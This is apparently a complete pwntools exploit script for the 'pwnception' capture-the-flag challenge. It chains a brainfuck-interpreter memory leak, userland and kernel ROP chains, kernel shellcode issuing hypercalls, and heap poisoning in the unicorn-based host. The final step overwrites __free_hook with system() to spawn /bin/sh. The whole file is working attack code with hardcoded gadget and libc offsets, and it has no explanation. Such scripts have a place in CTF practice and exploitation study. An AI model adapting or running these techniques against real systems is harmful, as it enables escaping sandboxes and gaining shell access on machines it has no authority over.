from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './userland'
if args.X:
    TARGET = './main'
HOST = 'pwnception.chal.perfect.blue'
PORT = 1

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        if args.X:
            return process(["./main", "./kernel", "./userland"], env={"LD_PRELOAD":"./libunicorn.so.1"})
            # return process(["./main", "./kernel", "./userland"], env={"LD_PRELOAD":"./libunicorn.so.1 ./libc.so.6"})
        else:
            return process(TARGET)
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
        
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D and not args.X:
    debug(r, [0x4e1, 0x5df])

# addrs
udata = 0x600000000000
shmem = 0x7fffffeff000
guard = 0x800000000000

kernel_base = 0xffffffff81000000
kernel_stack = 0xffff8801ffeff000
kernel_rsp   = 0xffff8801ffffe000

### userland gadgets
# pop gadgets
syscall = 0x00400cf2
rax = 0x00400121
rbx = 0x004008f4
r12_r13 = 0x00400af5
r13 = 0x00400af7
rbp = 0x004001c8
rsp_p1 = 0x00400af6

# weird gadgets
ret = 0x400d27
magic = 0x400d11
'''
806   400d0e:   48 89 f8                mov    rax,rdi
807   400d11:   48 89 f7                mov    rdi,rsi
808   400d14:   48 89 d6                mov    rsi,rdx
809   400d17:   48 89 ca                mov    rdx,rcx
810   400d1a:   4d 89 c2                mov    r10,r8
811   400d1d:   4d 89 c8                mov    r8,r9
812   400d20:   4c 8b 4c 24 08          mov    r9,QWORD PTR [rsp+0x8]
813   400d25:   0f 05                   syscall
814   400d27:   c3                      ret
'''
# 0x004008bd: mov rdx, r12 ; mov rsi, rbx ; call r13 ;  
magic2 = 0x4008bd

### kernel gadgets
k_leave   = kernel_base + 0x17f
k_rax_r11 = kernel_base + 0x137
k_int0x70 = kernel_base + 0x1db
k_read    = kernel_base + 0x8c
k_write   = kernel_base + 0x7f
k_iret    = kernel_base + 0xc1

gadgets = 240

payload = ''
payload += '+[>--------------------------------]'
payload += '>'*7
payload += '>.' * 8
payload += '>.' * 8
payload += '>.' * 8
payload += '>.' * 8
payload += '<' * 0x10
payload += '>,' *(8 * gadgets)
payload += '!'
r.sendafter(': ', payload)
bf = payload

leak = r.recvuntil('\x00'*7)
assert(len(leak) > 0x18)
canary = u64(leak[:8])
stack = u64(leak[8:16])
ret = u64(leak[16:24])
dbg('canary')
dbg('stack')
dbg('ret')
orig_base = stack-0x10

if args.X:
    # debug(r, [0x12e7]) # kernel_setreg
    # debug(r, [0x1798]) # kernel ip code
    # debug(r, [0x16e1]) # user syscall
    # debug(r, [0x17e4]) # iret val from kernel
    # debug(r, [0x1a81]) # kernel intr mprotect
    # debug(r, [0x1ab1]) # kernel intr mmap
    debug(r, [0x1ad5]) # int 0x71 
    # debug(r, [0x1bab, 0x1b84, 0x1b51]) # free write read
    # debug(r, [0x1bab]) # free

def setreg(rdi, rsi, rdx, base_frame=orig_base):
    payload = ''
    # rdi
    payload += flat(rax, 0x9, r13, rbx)
    payload += flat(rbx, rdi, magic2, magic)

    # rdx
    payload += flat(r12_r13, rdx, rbx, magic2) 

    # rsi
    payload += flat(rbx, rsi, magic2)

    # restore rbp
    payload += flat(rbp, base_frame) 
    return payload

payload = ''
# payload += setreg(kernel_base, kernel_base+0x10, 0)
# payload += flat(rax, 2, syscall)

# set kernel RW function pointer to shmem 
payload += setreg(0, shmem, 0x10)
payload += flat(rax, 0, syscall)

def enc(addr):
    return (0x10000000000000000 + addr - (kernel_base + 0x900))/8

# set kernel r11 -> 0x9
payload += setreg(1, shmem, 0x9)
payload += flat(rax, 1, syscall)

# build rop in kernel stack
payload += setreg(kernel_rsp-0x1000, 0x2000, 0x7)
payload += flat(rax, enc(shmem+8), syscall)

# ret 2 main in userland
payload += p64(0x40014d)

log.info(len(payload)/8)
payload = payload.ljust(8 * gadgets, '\x00')
r.send(payload)

# function pointer in shmem
r.send(p64(k_write))
r.send(p64(k_read))

# mprotect(kernel_rsp-8, 0x1000, 7)
payload = ''
payload = '\x00' * (0x1000-8)
payload += flat(k_rax_r11, k_int0x70, k_read, kernel_rsp+0x1000) #rsp-8, 0, 8
payload = payload.ljust(0x2000, '\xcc') 
r.send(payload)


r.recvuntil('\n')
r.recvuntil('\n')
r.recvuntil('\n')

# shellcode in kernel
def alloc(size):
    return asm('''
        xor eax, eax
        mov rdi, {}
        int 0x71
    '''.format(size))

def g2h(addr, length):
    return asm('''
        xor eax, eax
        inc eax
        mov rdi, {}
        mov rsi, {}
        int 0x71
    '''.format(addr, length))

def h2g(addr, length):
    return asm('''
        xor eax, eax
        inc eax
        inc eax
        mov rdi, {}
        mov rsi, {}
        int 0x71
    '''.format(addr, length))

def gout(addr, length):
    return asm('''
        mov rsi, {}
        mov cx, {}
        rep outsb 
    '''.format(addr, length))

def gin(addr, length):
    return asm('''
        mov rdi, {}
        mov cx, {}
        rep insb 
    '''.format(addr, length))

def free():
    return asm('''
        xor eax, eax
        inc eax
        inc eax
        inc eax
        int 0x71
    ''')

payload = ''
# @kernel_rsp + 0x1000
payload += alloc(0x28)
payload += h2g(kernel_rsp+0x2100, 0xa0)
payload += gout(kernel_rsp+0x2100, 0xa0) # leak libunicorn
payload += gin(kernel_rsp+0x2060, 0x8) # input got addr
payload += alloc(0x58)
payload += free()
payload += alloc(0x78)
payload += free()
payload += alloc(0x58)
payload += g2h(kernel_rsp+0x2000, 0x68)
payload += alloc(0x78)
payload += alloc(0x78)
payload += h2g(kernel_rsp+0x2100, 0x8)
payload += gout(kernel_rsp+0x2100, 0x8) # leak libc

payload += gin(kernel_rsp+0x2190, 0x8) # input fh-8 addr
payload += gin(kernel_rsp+0x2060, 0x10) # input "/bin/sh" and system addr

payload += alloc(0x88)
payload += free()
payload += alloc(0x98)
payload += free()
payload += alloc(0x88)
payload += g2h(kernel_rsp+0x2100, 0x98)
payload += alloc(0x98)
payload += alloc(0x98)
payload += g2h(kernel_rsp+0x2060, 0x10)
payload += free()


payload = payload.ljust(0x1000, '\x01')
# @kernel_rsp + 0x2000
payload += 'A'*0x58+p64(0x85)
payload += '!!!!!!!!' # will be replace with gin
payload = payload.ljust(0x100)
# @kernel_rsp + 0x2100
payload += 'B'*0x88 + p64(0xa5)
payload += '!!!!!!!!' # will be replace with gin
payload = payload.ljust(0x400)

# @kernel_rsp + 0x2460
# payload += p64(0x25) * (0x128/8)

r.send(payload.ljust(0x2000, '\xf4'))

r.recvuntil('y-region')
r.recv(0x80)
leak = u64(r.recv(8))
dbg('leak')
unicorn = leak - 0x1b488
dbg('unicorn')

got_realloc = unicorn + 0x2ff018
r.send(p64(got_realloc))
leak_0 = r.recv(1)
leak_1_7 = r.recv(7)
leak = u64(leak_0+leak_1_7)
dbg('leak')
base = leak - 0x97a30
dbg('base')

fh = base + 0x3ed8e8
system = base + 0x4f550

r.send(p64(fh-8)+"/bin/sh\x00"+p64(system))

r.interactive()
r.close()
